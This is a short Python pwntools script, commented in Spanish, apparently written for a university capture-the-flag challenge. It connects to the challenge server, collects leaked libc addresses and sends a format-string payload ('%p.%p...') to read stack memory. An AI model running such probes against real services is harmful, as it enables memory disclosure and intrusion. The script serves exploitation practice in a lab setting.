#!/usr/bin/env python3
"""
RETOSF - Debug: Analizar el flujo completo
"""

from pwn import *

context.arch = "i386"

p = remote("ic.catedras.linti.unlp.edu.ar", 15023)

# Recibir las direcciones de libc
libc_leaks = {}
while True:
    try:
        line = p.recvline()
        print(f"[*] {repr(line)}")
        if b":" in line and b"0x" in line:
            parts = line.strip().split(b": ")
            if len(parts) == 2:
                name = parts[0].decode().strip()
                addr = parts[1].decode().strip()
                libc_leaks[name] = addr
                print(f"    -> {name} = {addr}")
        elif b"Ingrese su input" in line:
            break
    except:
        break

print(f"\n[+] Leaks obtenidos: {libc_leaks}")

# Ahora enviamos un payload de format string
print("\n[*] Enviando payload format string...")
# Primero probamos con %p%p%p para ver si podemos leer stack
payload = b"%p.%p.%p.%p.%p.%p.%p.%p"
p.sendline(payload)

print("\n[*] Respuesta:")
try:
    output = p.recvall(timeout=2)
    print(repr(output))
    print(f"\nDecodificado:\n{output.decode(errors='replace')}")
except Exception as e:
    print(f"Error: {e}")

p.close()
